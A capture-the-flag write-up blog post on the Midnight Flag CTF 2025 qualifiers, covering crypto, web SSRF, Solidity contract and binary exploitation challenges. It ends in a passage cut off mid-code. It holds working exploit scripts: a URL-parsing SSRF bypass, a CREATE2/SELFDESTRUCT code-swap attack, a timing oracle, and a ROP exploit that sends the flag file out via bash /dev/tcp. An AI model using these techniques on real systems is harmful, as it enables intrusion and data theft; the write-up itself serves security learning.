---
来源: https://ptr-yudai.hatenablog.com/entry/2025/04/22/145743
类型: 博客writeup
获取日期: 2026-06-30
说明: ptr-yudai 2025年4月文章
---

、90日以上更新していないブログに表示しています。


I participated in the Midnight Flag CTF 2025 qualification round as a member of BunkyoWesterns.
This CTF features an onsite finals event that will be held in France.
We managed to secure 3rd place, so it looks like we’ll be heading to the finals as well.

I mainly focused on the pwnable and web3 challenges.
The pwnables in particular were really well-crafted.
Big thanks to [@MidnightFlag](https://x.com/MidnightFlag) for organizing such a great CTF!

* [Forensics](#Forensics)
  + [Empire sous Frozen (304pt)](#Empire-sous-Frozen-304pt)
* [Crypto](#Crypto)
  + [Highway To Hill (500pt)](#Highway-To-Hill-500pt)
* [Web](#Web)
  + [Disparity (274pt)](#Disparity-274pt)
* [Web3](#Web3)
  + [Alderaan (183pt)](#Alderaan-183pt)
  + [Sublocku (445pt)](#Sublocku-445pt)
  + [DoubleTrouble (498pt)](#DoubleTrouble-498pt)
* [Pwn](#Pwn)
  + [BlindTest (479pt)](#BlindTest-479pt)
  + [NeonPulse (498pt)](#NeonPulse-498pt)
  + [TraumaC (500pt)](#TraumaC-500pt)
  + [Sec Mem (500pt)](#Sec-Mem-500pt)

You can find the challenge files and sources on the [official](https://d.hatena.ne.jp/keyword/official) [GitHub](https://d.hatena.ne.jp/keyword/GitHub) repository:

[github.com](https://github.com/MidnightFlag/qualifiers-challenges-2025)

# Forensics

## [Empire](https://d.hatena.ne.jp/keyword/Empire) sous Frozen (304pt)

I must confess that I dumped the file and challenge description to the AI and got the flag.

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20250414/20250414234214.png)

# Crypto

## Highway To Hill (500pt)

[Kanon](https://d.hatena.ne.jp/keyword/Kanon) solved the other crypto challenges, but this one remained unsolved during the CTF because it involved a bit of guessing with a classical cipher.

Challenge description:

```
A secret message has been found as well as 3 encryption key. 

Hint : Hill, ASCII table 33 to 126
Secret : _!q7-8\!_/})!Z#XcPb'*3m,|>`<;ZB#>+`_CE?E

keyA = [[60,131,101,179,76],[1,134,179,127,115],[28,123,215,204,98],[157,22,28,219,15],[44,27,125,145,223]]
keyB = [[53,17],[5,46]]
keyC = [[89,52,162,39],[91,30,50,30],[222,183,124,41],[2,101,137,191]]
```

After Googling the hint, I came across a classical(?) cipher called the [Hill cipher](https://en.wikipedia.org/wiki/Hill_cipher).
The hint mentioned there were 94 possible characters, but using mod 94 didn’t produce valid results.
I changed the modulus to 93 instead, brute-forced all possible key combinations, and eventually got the flag.

```
F = Zmod(126 - 33) # Not Zmod(126 - 33 + 1)

cipher = "_!q7-8\\!_/})!Z#XcPb'*3m,|>`<;ZB#>+`_CE?E"
print(len(cipher))

keyA = [[60,131,101,179,76],[1,134,179,127,115],[28,123,215,204,98],[157,22,28,219,15],[44,27,125,145,223]]
keyB = [[53,17],[5,46]]
keyC = [[89,52,162,39],[91,30,50,30],[222,183,124,41],[2,101,137,191]]

A = Matrix(F, keyA)^-1
B = Matrix(F, keyB)^-1
C = Matrix(F, keyC)^-1

def decrypt(K, cipher):
    size = K.nrows()
    plain = ""
    for i in range(0, len(cipher), size):
        block = cipher[i:i+size]
        x = vector(F, [ord(c)-33 for c in block])
        y = K * x
        plain += "".join(chr(int(c)+33) for c in y)
    return plain

keys = [A, B, C]
for a, b, c in Permutations([0, 1, 2]):
    neko = cipher
    neko = decrypt(keys[a], neko)
    neko = decrypt(keys[b], neko)
    neko = decrypt(keys[c], neko)
    print(neko)
```

# Web

## Disparity (274pt)

The server was running a [PHP](https://d.hatena.ne.jp/keyword/PHP) script that fetched content from external web servers.

url.[php](https://d.hatena.ne.jp/keyword/php)

```
<?php

ini_set("default_socket_timeout", 5);

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    die("/url.php is only accessible with POST");
}

if (!isset($_POST['url']) || strlen($_POST['url']) === 0) {
    die("Parameter 'url' is mandatory");
}

$url = $_POST['url'];

try {
    $parsed = parse_url($url);
} catch (Exception $e){
    die("Failed to parse URL");
}
var_dump($parsed);

if (strlen($parsed['host']) === 0){
    die("Host can not be empty");
}

if ($parsed['scheme'] !== "http"){
    die("HTTP is the only option");
}

// Prevent DNS rebinding
try {
    $ip = gethostbyname($parsed['host']);
} catch(Exception $e) {
    die("Failed to resolve IP");
}

// Prevent from fetching localhost
if (preg_match("/^127\..*/",$ip) || $ip === "0.0.0.0"){
    die("Can't fetch localhost");
}

echo 'str_replace("'.$parsed['host'].'", "'.$ip.'", "'.$url.'")'."\n";
$url =  str_replace($parsed['host'],$ip,$url);
var_dump($url);

// Fetch url
try {
    ob_start();
    $len_content = readfile($url);
    $content = ob_get_clean();
} catch (Exception $e) {
    die("Failed to request URL");
}

if ($len_content > 0) {
    echo $content;
} else {
    die("Empty reply from server");
}

?>
```

The flag was stored on another local server that wasn’t directly accessible to the players.

flag.[php](https://d.hatena.ne.jp/keyword/php)

```
<?php

if ($_SERVER['HTTP_HOST'] === "localhost:8080"){
    echo getenv('FLAG');
} else {
    echo "You are not allowed to do that";
}
?>
```

The IP check could be bypassed by using notations like 0x7f000001, which are interpreted as [127.0.0.1](https://d.hatena.ne.jp/keyword/127.0.0.1). However, the challenge was that `flag.php` had a check on the `HTTP_HOST` header, and the hostname couldn’t be something like `localhost:8080` when using these kinds of IP notations.

Initially, I thought about abusing `str_replace` to modify the HTTP [scheme](https://d.hatena.ne.jp/keyword/scheme) and perform an LFI. However, I found that `gethostbyname` returns the original string if it fails to resolve the address.

While experimenting with `parse_url` and `readfile` on my local machine, I discovered an interesting behavior when parsing malformed [IPv6](https://d.hatena.ne.jp/keyword/IPv6)-like strings such as `fe00::`, which should normally resolve to [localhost](https://d.hatena.ne.jp/keyword/localhost).

Here’s the example:

```
http://xxx::/flag.php
```

When passed to `parse_url`, the host is interpreted as `xxx:`, but `readfile` tries to resolve `xxx` and fails:

Test script:

```
<?php
$url = "http://xxx::/flag.php";
var_dump(parse_url($url));
readfile($url);
```

Result:

```
array(3) {
  'scheme' =>
  string(4) "http"
  'host' =>
  string(4) "xxx:"
  'path' =>
  string(9) "/flag.php"
}
PHP Warning:  readfile(): php_network_getaddresses: getaddrinfo for xxx failed: Temporary failure in name resolution ...
...
```

Apparently, when a URL contains two colons in the host field, `parse_url` and `readfile` interpret it differently.
By leveraging this inconsistency, I was able to bypass the host checks and perform an SSRF to retrieve the flag.

```
$ curl -X POST http://chall4.midnightflag.fr:13990/url.php --data "url=http://localhost:8080:/flag.php"
MCTF{a1104b51a44ecb61585cafacd59f77c1}
```

# Web3

## Alderaan (183pt)

This was a very simple web3 challenge.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract Alderaan {
    event AlderaanDestroyed(address indexed destroyer, uint256 amount);
    bool public isSolved = false;

    constructor() payable{
        require(msg.value > 0,"Contract require some ETH !");
    }

    function DestroyAlderaan(string memory _key) public payable {
        require(msg.value > 0, "Hey, send me some ETH !");
        require(
            keccak256(abi.encodePacked(_key)) == keccak256(abi.encodePacked("ObiWanCantSaveAlderaan")),
            "Incorrect key"
        );

        emit AlderaanDestroyed(msg.sender, address(this).balance);

        isSolved = true;
        selfdestruct(payable(msg.sender));
    }
}
```

All that was required was to call the `DestroyAlderaan` function with the argument "ObiWanCantSaveAlderaan" and send some Ether along with the transaction.

Exploit:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/console.sol";
import { VmSafe } from "forge-std/Vm.sol";
import { Script } from "forge-std/Script.sol";
import { Alderaan } from "../src/Alderaan.sol";

contract Exploit is Script {
  Alderaan public chall;
  VmSafe.Wallet public solver;

  function setUp() public {
    chall = Alderaan(vm.envAddress("setup_contract_address"));
    solver = vm.createWallet(uint256(vm.envBytes32("user_private_key")));
  }

  function run() public {
    vm.startBroadcast(solver.privateKey);
    chall.DestroyAlderaan{ value: 1 }("ObiWanCantSaveAlderaan");
    require (chall.isSolved(), "Not solved!");
  }
}
```

## Sublocku (445pt)

The contract was a bit too long to include here, but only the following part was relevant.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract Sublocku {

    uint private size;
    uint256[][] private game;
    bool public isSolved = false;

    address public owner;
    address public lastSolver;


    constructor(uint256 _size,uint256[][] memory initialGrid) {
        owner = msg.sender;
        size = _size;
        require(initialGrid.length == size, "Grid cannot be empty");
        for (uint i = 0; i < size; i++) {
            require(initialGrid[i].length == size, "Each row must have the same length as the grid");
        }
        game = initialGrid;
    }


    function unlock(uint256[][] memory solve) public {

        require(solve.length == size, "Solution grid size mismatch");
        for (uint i = 0; i < size; i++) {
            require(solve[i].length == size, "Solution grid row size mismatch");
        }

        for (uint i = 0; i < size; i++) {
            for (uint j = 0; j < size; j++) {
                if (game[i][j] != 0) {
                    require(game[i][j] == solve[i][j], "Cannot modify initial non-zero values");
                }
            }
        }

        require(checkRows(solve),    "Row validation failed");
        require(checkColumns(solve), "Column validation failed");
        require(checkSquares(solve), "Square validation failed");
        lastSolver = tx.origin;
    }
...
```

It was a [Sudoku](https://d.hatena.ne.jp/keyword/Sudoku) checker that required submitting a fully filled [Sudoku](https://d.hatena.ne.jp/keyword/Sudoku) board.
However, both the board itself and [the field](https://d.hatena.ne.jp/keyword/the%20field) size were stored in private storage variables.

While contracts can't directly read each other's private storage, we can still [access](https://d.hatena.ne.jp/keyword/access) it using the `getStorageAt` [API](https://d.hatena.ne.jp/keyword/API).

I wrote a script to leak the board data from storage.

```
const { Web3 } = require('web3');
const web3 = new Web3('http://chall3.midnightflag.fr:13345/rpc');
const contractAddress = '0x685215B6aD89715Ef72EfB820C13BFa8E024401a';
const slot = 0;

web3.eth.getStorageAt(contractAddress, slot)
    .then(result => {
        const sizeValue = web3.utils.toBigInt(result);
        console.log(sizeValue);
    })
    .catch(error => console.error(error));

async function getGameArray(contractAddress) {
    const outerLengthHex = await web3.eth.getStorageAt(contractAddress, 1);
    const outerLength = web3.utils.toBigInt(outerLengthHex);

    const outerOffsetHex = web3.utils.soliditySha3({ type: 'uint256', value: 1 });
    const outerOffset = web3.utils.toBigInt(outerOffsetHex);

    let gameArray = [];
    for (let i = 0; i < outerLength; i++) {
        const pointerSlot = outerOffset + web3.utils.toBigInt(i);
        const innerLengthHex = await web3.eth.getStorageAt(contractAddress, pointerSlot);
        const innerLength = web3.utils.toBigInt(innerLengthHex);

        const innerOffsetHex = web3.utils.soliditySha3({ type: 'uint256', value: pointerSlot });
        const innerOffset = web3.utils.toBigInt(innerOffsetHex);

        let innerArray = [];
        for (let j = 0; j < innerLength; j++) {
            const elementSlot = innerOffset + web3.utils.toBigInt(j);
            const elementHex = await web3.eth.getStorageAt(contractAddress, elementSlot);
            const element = web3.utils.toBigInt(elementHex);
            innerArray.push(element.toString());
        }
        gameArray.push(innerArray);
    }

    return gameArray;
}

getGameArray(contractAddress)
    .then(game => { console.log(game); })
    .catch(error => { console.error(error); });
```

After successfully extracting the board, I solved the puzzle locally and deployed a contract to call the `unlock` function with the correct solution.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/console.sol";
import { VmSafe } from "forge-std/Vm.sol";
import { Script } from "forge-std/Script.sol";
import { Sublocku } from "../src/Sublocku.sol";

contract Exploit is Script {
  Sublocku public chall;
  VmSafe.Wallet public solver;

  function setUp() public {
    chall = Sublocku(vm.envAddress("setup_contract_address"));
    solver = vm.createWallet(uint256(vm.envBytes32("user_private_key")));
  }

  function run() public {
    vm.startBroadcast(solver.privateKey);

    uint256[][] memory solve = new uint256[][](9);
    for (uint256 i = 0; i < 9; i++) {
      solve[i] = new uint256[](9);
    }
    solve[0][0] = 3;
    solve[0][1] = 1;
...
    solve[8][7] = 4;
    solve[8][8] = 8;

    chall.unlock(solve);

    console.logAddress(chall.lastSolver());
  }
}
```

## DoubleTrouble (498pt)

The contract is very simple.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract DoubleTrouble {
    bool public isSolved = false;
    mapping(address => bool) public validContracts;

    function validate(address _contract) public  {
        uint256 size;
        assembly {
            size := extcodesize(_contract)
        }
        if (size == 0 || size > 5) {
            revert("Invalid contract");
        }
        validContracts[_contract] = true;
    }

    function flag(address _contract) public {
        require(validContracts[_contract], "Given contract has not been validated");

        uint256 size;
        assembly {
            size := extcodesize(_contract)
        }
        bytes memory code = new bytes(size);
        assembly {
            extcodecopy(_contract, add(code, 0x20), 0, size)
        }
        bytes memory keyBytecode = hex"1f1a99ed17babe0000f007b4110000ba5eba110000c0ffee";
        
        require(keccak256(code) == keccak256(keyBytecode),"Both bytecodes don't match");

        isSolved = true;
    }

}
```

There were two public functions in the contract:

1. `validate`: Checks whether the code size of a given contract is greater than 0 and less than 6 bytes.
2. `flag`: Marks the challenge as solved if the given contract contains a specific bytecode (`keyBytecode`) and has already passed validation.

The problem is that the size of `keyBytecode` is clearly more than 5 bytes, so we can’t pass the validation step with the full payload deployed directly.
We need a way to "change" the code at a specific contract address between the two steps.

The validate function checks that the code size is not zero, which means we can’t simply call it from inside a contract constructor (where the code size is temporarily zero). So I came up with an idea to use `SELFDESTRUCT` and `CREATE2` to overwrite contracts at the same address with different bytecode.

This type of attack has been used before—for example, in the [Tornado Cash governance hack](https://www.decipherclub.com/tornado-cash-governance-hack/).

The idea:

* Create a `Factory` contract that has two functions:
  + `deployMinimal`: Deploys a very small contract that immediately self-destructs.
  + `deployAttack`: Deploys a contract that contains the full `keyBytecode`.
  + Both deployments use the `CREATE` opcode.
* Create a `FactoryFactory` contract that deploys `Factory` using `CREATE2`.
* Use `FactoryFactory` to:
  + Deploy `Factory`.
  + Use it to deploy the minimal contract.
  + Let's call the address of `Factory` → X, and the address of the minimal contract → Y.
* Call `SELFDESTRUCT` on both X and Y to wipe them from the blockchain.
* Use `FactoryFactory` again to:
  + Re-deploy `Factory` (same code and salt, so same address X).
  + Call `deployAttack` to deploy the exploit contract (also same nonce, so address Y is reused).

The reason this works is:

* `CREATE2` allows re-deploying `Factory` at the same address since the previous one was destroyed.
* Inside the re-deployed `Factory`, `CREATE` will assign the same address Y to the new contract, since the nonce is reset.

This way, the contract at address Y passes the `validate` check when it's small, then is later overwritten with a contract containing `keyBytecode` for the `flag` check.

The next problem is to create a very small self-destructing contract.
The smallest contract I could create that self-destructs looks like this:

```
32    ; PUSH tx.origin
ff    ; SELFDESTRUCT
```

To deploy this tiny payload, I used the following initialization code:

```
60 02    ; PUSH 2    -- copy 2 bytes
60 0c    ; PUSH 12   -- from offset=12
60 00    ; PUSH 0    -- to offset=0
39       ; COPYCODE
60 02    ; PUSH 2    -- return 2 bytes
60 00    ; PUSH 0    -- from offset=0
f3       ; RETURN
33 ff    ; actual runtime code
```

Full exploit:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/console.sol";
import { VmSafe } from "forge-std/Vm.sol";
import { Script } from "forge-std/Script.sol";
import { DoubleTrouble } from "../src/DoubleTrouble.sol";

contract FactoryFactory {
  function deployFactory(bytes32 salt) external returns (address deployed) {
    deployed = address(new Factory{ salt: salt }());
  }
}

contract Factory {
  function deployMinimal() external returns (address deployed) {
    // 32 tx.origin (33 msg.sender?)
    // ff SELFDESTRUCT
    bytes memory code = hex"6002600c60003960026000f333ff";
    assembly {
      deployed := create(0, add(code, 0x20), mload(code))
      if iszero(extcodesize(deployed)) {
        revert(0, 0)
      }
    }
  }

  function deployAttack() external returns (address deployed) {
    bytes memory code = hex"6018600c60003960186000f31f1a99ed17babe0000f007b4110000ba5eba110000c0ffee";
    assembly {
      deployed := create(0, add(code, 0x20), mload(code))
      if iszero(extcodesize(deployed)) {
        revert(0, 0)
      }
    }
  }

  function destruct() external {
    selfdestruct(payable(0));
  }
}

contract Helper {
  DoubleTrouble public chall;
  FactoryFactory public ff;

  constructor(DoubleTrouble a, FactoryFactory b) {
    chall = a;
    ff = b;
  }

  function exploit1() public {
    bytes32 salt = keccak256(abi.encode(uint(1337)));

    address factoryAddr = ff.deployFactory(salt);
    Factory factory = Factory(factoryAddr);

    address victimAddress = factory.deployMinimal();

    console.logAddress(factoryAddr);
    console.logAddress(victimAddress);

    chall.validate(victimAddress);
    (bool success,) = victimAddress.call("");
    require(success, "Failed to destroy Factory");

    factory.destruct();
  }

  function exploit2() public {
    bytes32 salt = keccak256(abi.encode(uint(1337)));

    address factoryAddr = ff.deployFactory(salt);
    Factory factory = Factory(factoryAddr);

    address evilAddress = factory.deployAttack();
    console.logAddress(factoryAddr);
    console.logAddress(evilAddress);

    chall.flag(evilAddress);
    require(chall.isSolved(), "Not solved!");
  }
}

contract Exploit is Script {
  DoubleTrouble public chall;
  VmSafe.Wallet public solver;
  FactoryFactory public ff;

  function setUp() public {
    chall = DoubleTrouble(vm.envAddress("setup_contract_address"));
    ff = FactoryFactory(vm.envAddress("ff_contract_address"));
    solver = vm.createWallet(uint256(vm.envBytes32("user_private_key")));
  }

  function run() public {
    vm.startBroadcast(solver.privateKey);

    Helper helper = new Helper(chall, ff);
    // Transaction 1
    //helper.exploit1();

    // Transaction 2
    //helper.exploit2();
  }
}
```

# Pwn

I feel happy when I see a pwnable challenge with its source code and Dockerfile attached :)

## BlindTest (479pt)

This is a seccomp jail challenge.

```
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <seccomp.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>

void setup_seccomp() {
    scmp_filter_ctx ctx;
    ctx = seccomp_init(SCMP_ACT_ALLOW); 
    if (!ctx) {
        perror("seccomp_init");
        exit(1);
    }

    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(write), 0);
    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(socket), 0);
    
    if (seccomp_load(ctx) < 0) {
        perror("seccomp_load");
        seccomp_release(ctx);
        exit(1);
    }
    seccomp_release(ctx);
}

int main() {
    char command[3000];
    
    setup_seccomp();
    
    while (1) {
        if (fgets(command, sizeof(command), stdin) == NULL) {
            break;
        }
        system(command);
    }
    
    return 0;
}
```

The service allows us to execute any system commands, but the seccomp filter prohibits the `write` and `socket` system calls.

To leak the flag, we needed an [oracle](https://d.hatena.ne.jp/keyword/oracle).

The server uses `fgets`, which returns NULL and causes the process to exit if the sending socket is shut down.
I noticed that the time it takes for the receiving socket to close differs depending on whether the process exits normally or is killed by seccomp.

For example:

```
[ 1 -lt 2 ] && echo 1 || sleep 1  # about 0.3 sec
[ 2 -lt 2 ] && echo 1 || sleep 1  # about 0.6 sec
```

By measuring the time between sending input and the socket being closed, I was able to infer whether the process exited cleanly or crashed, allowing us to extract the flag bit by bit.
My initial idea was to use `dd` to check the ASCII [value](https://d.hatena.ne.jp/keyword/value) of a flag byte at a specific offset.

```
[ $(dd if=flag.txt bs=1 skip=OFFSET count=1 2>/dev/null | od -An -tuC) -lt THRESHOLD ] && sleep 1 || echo 1
```

However, this approach didn't work because the use of [pipes](https://d.hatena.ne.jp/keyword/pipes) was restricted because `write` was banned due to seccomp.

Instead, I turned to the `cmp` command, which turned out to be really useful. According to the manual, `cmp` supports comparing two files at specific offsets.

```
SYNOPSIS
       cmp [OPTION]... FILE1 [FILE2 [SKIP1 [SKIP2]]]
...
       -i, --ignore-initial=SKIP1:SKIP2
              skip first SKIP1 bytes of FILE1 and first SKIP2 bytes of FILE2

       -n, --bytes=LIMIT
              compare at most LIMIT bytes

       -s, --quiet, --silent
              suppress all normal output
```

This means we can directly compare a single byte of the flag with a byte from another file (like a known binary), without needing any intermediate shell features like [pipes](https://d.hatena.ne.jp/keyword/pipes).

By adjusting the offsets and observing `cmp`'s exit code, I was able to build a timing [oracle](https://d.hatena.ne.jp/keyword/oracle) to extract the flag byte-by-byte.

```
import time
import threading
from ptrlib import *

TH = 0.5

logger.level = 0

with open("locale", "rb") as f:
    bin_locale = f.read()

index_table = {}
for c in string.printable:
    index_table[c] = bin_locale.index(c.encode())

def measure(path: str, offset: int, c: str):
    global found
    cmd = f"cmp -s -i{offset}:{index_table[c]} -n1 {path} /usr/bin/locale && sleep 1 || echo 1"

    sock = Socket("chall3.midnightflag.fr", 11913)
    #sock = Socket("localhost", 4444)
    sock.sendline(cmd)
    sock.shutdown('send')

    start = time.time()
    try:
        sock.recv()
    except (ConnectionResetError, ConnectionAbortedError):
        if time.time() - start > TH:
            found = c

flag = ""
for offset in range(len(flag), 0x100):

    found = None
    th_list = []
    for c in string.printable:
        if found is not None:
            break
        th = threading.Thread(target=measure, args=("/home/blind_test/chall/flag.txt", offset, c))
        th.start()
        th_list.append(th)
        time.sleep(0.05)

    for th in th_list:
        th.join()

    flag += found
    print(found, flag)
```

## NeonPulse (498pt)

This challenge is a thread-based server that can store data.
The code is a bit long but the following is the relevant part:

```
struct req_data {
    size_t length;
    char *dest;
};

struct req_data global_req;

...


void *handle_update(void *arg) {
    int client_fd = *(int *)arg;
    free(arg);

    write(client_fd, "Set the size:\n", 15);
    char size_line[32] = {0};
    int n = read(client_fd, size_line, sizeof(size_line) - 1);
    if(n <= 0) {
        close(client_fd);
        return NULL;
    }
    trim_newline(size_line);

    size_t safe_length = 0;
    if (sscanf(size_line, "%zu", &safe_length) != 1) {
        write(client_fd, "Invalid SIZE format.\n", 22);
        close(client_fd);
        return NULL;
    }
    printf("[NeonPulse][UPDATE] Safe length set to %zu.\n", safe_length);

    char *local_buffer = alloca(safe_length);

    global_req.length = safe_length;

    write(client_fd, "Press ENTER to confirm update...\n", 34);
    char confirm[8] = {0};
    n = read(client_fd, confirm, sizeof(confirm)-1);

    pthread_mutex_lock(&dest_mutex);
    size_t i = 0;
    while(i < global_req.length) { 
        if(read(client_fd, local_buffer + i, 1) <= 0)
            break;
        i++;
    }

    global_req.dest = local_buffer;
    pthread_mutex_unlock(&dest_mutex);

    printf("[NeonPulse][UPDATE] Update complete. New message: %.20s...\n", global_req.dest);
    write(client_fd, "Update complete.\n", 18);
    return NULL;
}

void *handle_modify(void *arg) {
    int client_fd = *(int *)arg;
    free(arg);

    write(client_fd, "Set the new size:\n", 19);
    char size_line[32];
    memset(size_line, 0, sizeof(size_line));

    int n = read(client_fd, size_line, sizeof(size_line)-1);
    if(n <= 0) {
        close(client_fd);
        return NULL;
    }
    trim_newline(size_line);

    size_t new_length = 0;
    if (sscanf(size_line, "%zu", &new_length) != 1) {
        write(client_fd, "Invalid MODIFY format.\n", 24);
        close(client_fd);
        return NULL;
    }

    printf("[DataShadow][MODIFY] Before modification, length = %zu.\n", global_req.length);
    printf("[DataShadow][MODIFY] Changing length from %zu to %zu.\n", global_req.length, new_length);
    global_req.length = new_length;

    write(client_fd, "Modify complete.\n", 18);
    close(client_fd);
    return NULL;
}


void *handle_show(void *arg) {
    int client_fd = *(int *)arg;
    free(arg);
    
    char response[512];
    pthread_mutex_lock(&dest_mutex);
    snprintf(response, sizeof(response), "Current display message: %s\n", global_req.dest);
    pthread_mutex_unlock(&dest_mutex);
    
    write(client_fd, response, strlen(response));
    close(client_fd);
    return NULL;
}

...


int main() {
...
        pthread_t tid;
        if (strncmp(cmd, "UPDATE", 6) == 0) {
            pthread_create(&tid, NULL, handle_update, client_fd);
        } else if (strncmp(cmd, "MODIFY", 6) == 0) {
            pthread_create(&tid, NULL, handle_modify, client_fd);
        } else if (strncmp(cmd, "SHOW", 4) == 0) {
            pthread_create(&tid, NULL, handle_show, client_fd);
        } else {
            write(*client_fd, "Unknown command.\n", 18);
            close(*client_fd);
            free(client_fd);
            continue;
        }
        pthread_detach(tid);
...
}
```

The bug lies in the following code in the `handle_update` function.

```
    char *local_buffer = alloca(safe_length);

    global_req.length = safe_length;

    write(client_fd, "Press ENTER to confirm update...\n", 34);
    char confirm[8] = {0};
    n = read(client_fd, confirm, sizeof(confirm)-1);

    pthread_mutex_lock(&dest_mutex);
    size_t i = 0;
    while(i < global_req.length) { 
        if(read(client_fd, local_buffer + i, 1) <= 0)
            break;
        i++;
    }

    global_req.dest = local_buffer;
    pthread_mutex_unlock(&dest_mutex);
```

Initially, I noticed that the bytes read from a client socket are not null-terminated.
Even if the client closes the connection during `read`, the global buffer still gets updated with whatever data was read.

This allows us to leak uninitialized data from the thread’s stack via another connection because the buffer might contain remnants of previous stack content.

The second bug involves the use of `alloca` without a proper size check.

While `alloca` takes a `size_t` and we can’t directly pass a negative [value](https://d.hatena.ne.jp/keyword/value), we can send a very large [value](https://d.hatena.ne.jp/keyword/value).
Since `alloca` just subtracts the requested size from the current stack pointer, this can move the stack pointer far outside its original range.[\*1](#f-6aef2a88 "Normally, GCC inserts a write loop after alloca to prevent this kind of attack by triggering a page fault early. However, in this case, the program didn’t have such a guard—probably because the author disabled it via a compiler flag or used a different compiler altogether.")

Because the server spawns multiple threads, overflowing the stack in one thread can actually corrupt the stack of another thread.
This creates a cross-thread stack buffer overflow, which significantly increases the potential impact of the [vulnerability](https://d.hatena.ne.jp/keyword/vulnerability).

I could write the exploit immediately because I wrote a similar challenge in a previous BlackHat MEA Finals :P

```
import time
import os
from ptrlib import *

REMOTE = True
if REMOTE:
    SLEEP = 3.0
    HOST = "chall2.midnightflag.fr"
    PORT = 12646
else:
    SLEEP = 0.3
    HOST = "localhost"
    PORT = 31337

def create_socket():
    return Socket(HOST, PORT)

def update(size: int=None, data: bytes=None) -> sock:
    sock = create_socket()
    sock.sendline("UPDATE")

    if size is not None:
        sock.sendlineafter("Set the size:\n", size)

        if data is not None:
            sock.sendlineafter("update...\n", "")
            sock.send(data)
    return sock

def modify(size: int) -> sock:
    sock = create_socket()
    sock.sendline("MODIFY")
    sock.sendlineafter("Set the new size:\n", size)

def show() -> bytes:
    sock = create_socket()
    sock.sendline("SHOW")
    sock.recvuntil("message: ")
    time.sleep(0.1)
    leak = sock.recvline()
    sock.close()
    return leak

os.system("docker stop neonpulse")

libc = ELF("./libc.so.6")
if not REMOTE:
    main = Process(["docker", "run", "--rm", "-p", "31337:1337", "--init", "--name=neonpulse", "neonpulse:latest"])
    time.sleep(1)

# Leak libc
s1 = update(0xe0)
s1.sendlineafter("update...\n", "")
time.sleep(SLEEP)
s1.send(b'A'*8)
time.sleep(SLEEP)
s1.shutdown('send')
libc.base = u64(show()[8:]) - 0x5265b
s1.close()

# Pwn
s1 = update()
s2 = update(0x100)
s1.sendlineafter("Set the size:\n", 0x800fb0)
s1.sendlineafter("update...\n", "")
time.sleep(SLEEP)

print(hex(next(libc.gadget('pop rdi; ret;'))))
payload  = b"A"*8
payload += p64(libc.section('.bss') + 0x1800)
payload += b"C"*0x4
payload += p32(5) # fd
payload += b"E"*0x4
payload += b"F"*0x4
payload += flat([
    0, # saved rbp
    next(libc.gadget('pop rdi; ret;')),
    libc.section('.bss') + 0x1800,
    next(libc.gadget('ret;')),
    libc.symbol('system'),
], map=p64)
s1.send(payload)
time.sleep(SLEEP)

s2.sendlineafter("update...\n", "")
time.sleep(SLEEP)

s1.shutdown("send")
s1.close()
time.sleep(SLEEP)

s2.send("bash -c 'cat /home/neon_pulse/flag.txt > /dev/tcp/SERVER/PORT\0")
time.sleep(SLEEP)

s2.shutdown("send")

main.sh()
```

## TraumaC (500pt)

Okay, [Objective-C](https://d.hatena.ne.jp/keyword/Objective-C)......

I'd never read or written a program in [Objective-C](https://d.hatena.ne.jp/keyword/Objective-C) :(

```
#import <Foundation/Foundation.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

@interface Patient : NSObject {
    id patientID; // Change: from NSString* to id
    NSInteger vitalStatus;
}
@property (nonatomic, assign) id patientID;  // Change here
@property (nonatomic, assign) NSInteger vitalStatus;
- (void)setPatientInfoWithId:(NSString *)pid status:(NSInteger)status;
- (void)displayPatientInfo;
@end

@implementation Patient
@synthesize patientID, vitalStatus;
- (void)setPatientInfoWithId:(NSString *)pid status:(NSInteger)status {
    self.patientID = pid;
    self.vitalStatus = status;
}
- (void)displayPatientInfo {
    NSLog(@"Patient ID: %@", self.patientID);
    NSLog(@"Vital Status: %ld", (long)self.vitalStatus);
}
@end

@interface NeuroReport : NSObject {
    char *reportData;
    Patient *associatedPatient;
}
@property (nonatomic, assign) char *reportData;
@property (nonatomic, retain) Patient *associatedPatient;
- (void)createReportWithSize:(size_t)size;
- (void)modifyReport;
@end

@implementation NeuroReport
@synthesize reportData, associatedPatient;
- (void)createReportWithSize:(size_t)size {
    reportData = malloc(size);
    if (reportData == NULL) {
        NSLog(@"Memory allocation error.");
        return;
    }
    
    NSLog(@"Enter report content:");
    if (fgets(reportData, size, stdin) == NULL) {
        NSLog(@"Error reading input.");
        return;
    }
    size_t len = strlen(reportData);
    if (len > 0 && reportData[len - 1] == '\n') {
        reportData[len - 1] = '\0';
    }
}

- (void)modifyReport {
    if (reportData != NULL) {
        free(reportData);
        reportData = NULL;
    }
    size_t size = 160; 
    reportData = malloc(size);
    if (reportData == NULL) {
        NSLog(@"Memory allocation error during modification.");
        return;
    }
    NSLog(@"Enter new report content:");
    if (fgets(reportData, size, stdin) == NULL) {
        NSLog(@"Error reading input.");
        return;
    }
    size_t len = strlen(reportData);
    if (len > 0 && reportData[len - 1] == '\n') {
        reportData[len - 1] = '\0';
    }
    NSLog(@"Report modified.");
}
@end

int main(int argc, const char * argv[]) {
    setvbuf(stdout, NULL, _IONBF, 0);
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    NSMutableArray *patients = [NSMutableArray array];
    NSMutableArray *reports = [NSMutableArray array];
    
    int choice = 0;
    char bufferInput[128];
    int i;    
    while (1) {
        NSLog(@"\n========================================\n Trauma Team Emergency Interface - Neon City\n========================================\n1. Create a patient record\n2. Display all patient records\n3. Modify a patient's ID\n4. Generate a report for a patient\n5. Modify the report\n6. Check if the patient is cured\n7. Quit\nYour choice:");
        
